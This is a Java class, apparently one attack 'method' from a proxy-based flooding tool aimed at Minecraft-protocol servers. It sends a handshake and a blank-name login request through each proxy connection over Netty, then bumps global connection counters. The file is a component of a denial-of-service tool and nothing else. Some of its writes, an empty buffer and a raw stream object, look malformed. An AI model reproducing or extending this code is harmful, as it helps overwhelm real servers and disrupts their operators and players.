package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.Handshake;
import IO.SYVERIS.utils.LoginRequest;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class YooniksCry implements Method {
   private Handshake handshake;
   private byte[] bytes;
   public static String bert = "";

   public YooniksCry() {
      this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
      this.bytes = this.handshake.getWrappedPacket();
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(bert)).getWrappedPacketC()));
      channel.writeAndFlush(b);
      channel.writeAndFlush(bbbb);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
   }
}
